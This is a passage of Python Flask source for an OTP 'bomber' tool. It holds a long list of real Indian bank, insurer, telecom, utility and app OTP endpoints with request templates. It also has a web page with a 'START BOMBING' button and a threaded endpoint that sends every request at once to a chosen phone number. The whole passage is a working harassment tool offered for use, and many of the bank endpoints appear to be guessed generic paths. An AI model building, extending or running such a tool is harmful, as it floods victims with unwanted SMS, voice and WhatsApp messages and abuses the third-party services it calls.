    {"name": "Adda52 Call", "url": "https://adda52.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "5paisa Call", "url": "https://5paisa.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Go First WhatsApp", "url": "https://flygofirst.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GESCOM WhatsApp", "url": "https://gescom.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "My11Circle SMS", "url": "https://www.my11circle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Max Life WhatsApp", "url": "https://maxlifeinsurance.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Vistara WhatsApp", "url": "https://airvistara.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "UPPCL Call", "url": "https://www.uppcl.org/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Jio WhatsApp", "url": "https://jio.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Chennai Metro Water WhatsApp", "url": "https://chennaimetrowater.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Suryoday Bank WhatsApp", "url": "https://suryodaybank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "YouTube Music SMS", "url": "https://music.youtube.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cleartrip Call", "url": "https://cleartrip.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "PokerBaazi Call", "url": "https://pokerbaazi.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Clovia SMS", "url": "https://www.clovia.com/api/v4/signup/check-existing-user", "method": "GET", "headers": {}, "data": None},
    {"name": "Fino Payments Bank Call", "url": "https://finopayments.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "JK Bank Call", "url": "https://jkbank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HealthifyMe SMS", "url": "https://www.healthifyme.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Delhi Jal Board SMS", "url": "https://www.delhijalboard.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "JioCinema SMS", "url": "https://www.jiocinema.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Dominos Call", "url": "https://dominos.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds Call", "url": "https://netmeds.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zerodha SMS", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Gujarat Gas SMS", "url": "https://www.gujaratgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "FreeCharge Call", "url": "https://freecharge.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Google Pay WhatsApp", "url": "https://pay.google.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Godrej SMS", "url": "https://www.godrejnaturesbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Kerala Water Authority Call", "url": "https://www.kwa.kerala.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
]

# === FILE 4 SE APIS (apis4.txt se - Voice aur WhatsApp zyada) ===
file4_apis = [
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Stratzy Phone OTP", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
    {"name": "Lenskart SMS Enhanced", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "KPN Fresh WEB", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Rappi WhatsApp V2", "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'},
    {"name": "Meru Cab Enhanced", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "BeepKart Enhanced", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount"}}'},
    {"name": "Lending Plate Enhanced", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
    {"name": "Snitch Enhanced", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "Dayco India Enhanced", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "PenPencil Enhanced", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "NoBroker Enhanced", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "Cossouq Enhanced", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0"},
    {"name": "ShipRocket Enhanced", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik Enhanced", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe Enhanced", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Univest Enhanced", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten Enhanced", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"ad_id":"","device_info":{{}},"phone":"{p}","email":"test@gmail.com"}}'},
    {"name": "Wakefit Enhanced", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "CaratLane Enhanced", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
]

# === FILE 5 SE APIS (apis5.txt se - Extra Banking, Insurance, Govt) ===
file5_apis = [
    {"name": "Mobikwik SMS", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "FreeCharge SMS", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Airtel Thanks", "url": "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Jio", "url": "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Vodafone Idea", "url": "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Toppr", "url": "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "WhiteHat Jr", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Pristyn Care", "url": "https://www.pristyncare.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata 1mg", "url": "https://www.1mg.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PolicyBazaar", "url": "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "CoverFox", "url": "https://www.coverfox.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Acko", "url": "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Digit Insurance", "url": "https://www.godigit.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Ergo", "url": "https://www.hdfcergo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ICICI Lombard", "url": "https://www.icicilombard.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Bajaj Allianz", "url": "https://www.bajajallianz.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Star Health", "url": "https://www.starhealth.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Max Bupa", "url": "https://www.maxbupa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Life", "url": "https://www.kotaklife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "LIC India", "url": "https://www.licindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Life", "url": "https://www.hdfclife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Axis Bank", "url": "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ICICI Bank", "url": "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Bank", "url": "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "SBI Bank", "url": "https://www.sbi.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Kotak Bank", "url": "https://www.kotak.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Yes Bank", "url": "https://www.yesbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "IndusInd Bank", "url": "https://www.indusind.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "IDFC Bank", "url": "https://www.idfcfirstbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "AU Bank", "url": "https://www.aubank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "RBL Bank", "url": "https://www.rblbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Bandhan Bank", "url": "https://www.bandhanbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Federal Bank", "url": "https://www.federalbank.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Canara Bank", "url": "https://www.canarabank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PNB", "url": "https://www.pnbindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Bank of Baroda", "url": "https://www.bankofbaroda.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Union Bank", "url": "https://www.unionbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Indian Bank", "url": "https://www.indianbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Central Bank", "url": "https://www.centralbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Bank of India", "url": "https://www.bankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "IDBI Bank", "url": "https://www.idbibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "UCO Bank", "url": "https://www.ucobank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Indian Overseas Bank", "url": "https://www.iob.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Punjab & Sind Bank", "url": "https://www.psbindia.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

# === MERGE SABHI APIS (200+ TOTAL) ===
all_apis = file1_apis + file2_apis + file3_apis + file4_apis + file5_apis

for api in all_apis:
    if api not in APIS:
        APIS.append(api)

print(f"[+] TOTAL APIS LOADED: {len(APIS)}")

# ============ HTML UI ============
HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>💀 BOMBER - SHUVO & FELIX 💀</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
        .box { max-width: 500px; margin: auto; background: #111; padding: 30px; border-radius: 10px; border: 2px solid #0f0; }
        input, select, button { padding: 12px; margin: 10px; width: 90%; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 5px; font-size: 16px; }
        button { background: #0f0; color: #000; cursor: pointer; font-weight: bold; }
        .log { margin-top: 20px; padding: 10px; background: #1a1a1a; border-radius: 5px; height: 300px; overflow-y: scroll; text-align: left; font-size: 12px; }
        .key { color: #ff0; font-weight: bold; }
        .count { color: #f00; }
    </style>
</head>
<body>
    <div class="box">
        <h1>💀 ULTIMATE BOMBER 💀</h1>
        <p>🔑 <span class="key">SHUVO</span> | <span class="key">FELIX</span></p>
        <p>📡 <span class="count">{{count}}</span> APIs ACTIVE</p>
        <input type="text" id="phone" placeholder="Enter 10 digit number">
        <select id="key">
            <option value="SHUVO">🔴 SHUVO KEY</option>
            <option value="FELIX">🔵 FELIX KEY</option>
        </select>
        <select id="mode">
            <option value="all">💀 ALL (SMS+Voice+WA)</option>
            <option value="sms">📱 SMS ONLY</option>
            <option value="voice">📞 VOICE ONLY</option>
            <option value="whatsapp">💬 WHATSAPP ONLY</option>
        </select>
        <button onclick="startBomb()">💣 START BOMBING 💣</button>
        <div class="log" id="log">⚡ Ready. Enter number and key. ⚡</div>
    </div>
    <script>
        function startBomb() {
            let phone = document.getElementById('phone').value;
            let key = document.getElementById('key').value;
            let mode = document.getElementById('mode').value;
            if(!phone || phone.length < 10) { alert("Invalid number!"); return; }
            document.getElementById('log').innerHTML = "🔥 BOMBING STARTED 🔥\\n";
            let es = new EventSource(`/api/bomb?phone=${phone}&key=${key}&mode=${mode}`);
            es.onmessage = (e) => {
                let log = document.getElementById('log');
                log.innerHTML += e.data + "\\n";
                log.scrollTop = log.scrollHeight;
            };
            es.onerror = () => es.close();
        }
    </script>
</body>
</html>
'''

def send_req(api, phone):
    try:
        url = api['url'](phone) if callable(api['url']) else api['url'].format(phone=phone)
        headers = api.get('headers', {})
        data = None
        if api.get('data'):
            data = api['data'](phone) if callable(api['data']) else api['data'].format(phone=phone)
        if api['method'] == 'GET':
            r = requests.get(url, headers=headers, timeout=5)
        else:
            r = requests.post(url, headers=headers, data=data, timeout=5)
        return {"name": api['name'], "status": r.status_code, "ok": r.status_code < 400}
    except Exception as e:
        return {"name": api['name'], "status": str(e), "ok": False}

@app.route('/')
def home():
    return render_template_string(HTML, count=len(APIS))

@app.route('/api/bomb')
def bomb():
    def generate():
        phone = request.args.get('phone', '').strip()
        key = request.args.get('key', '').upper()
        mode = request.args.get('mode', 'all')
        
        if key not in VALID_KEYS:
            yield f"data: ❌ INVALID KEY! Use SHUVO or FELIX\\n\\n"
            return
        
        filtered = []
        for api in APIS:
            name = api['name'].lower()
            if mode == 'all':
                filtered.append(api)
            elif mode == 'sms' and 'voice' not in name and 'whatsapp' not in name:
                filtered.append(api)
            elif mode == 'voice' and 'voice' in name:
                filtered.append(api)
            elif mode == 'whatsapp' and 'whatsapp' in name:
                filtered.append(api)
        
        yield f"data: 🔥 KEY: {key} | TARGET: +91{phone} | MODE: {mode} | APIS: {len(filtered)}\\n\\n"
        
        success = 0
        fail = 0
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(send_req, api, phone): api for api in filtered}
            for future in as_completed(futures):
                res = future.result()
                if res['ok']:
                    success += 1
                    yield f"data: ✅ {res['name']} - {res['status']}\\n"
                else:
                    fail += 1
                    yield f"data: ❌ {res['name']} - {res['status']}\\n"
        
        yield f"data: \\n💀 DONE - SUCCESS: {success} | FAIL: {fail}\\n"
    
    return Response(generate(), mimetype='text/event-stream')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)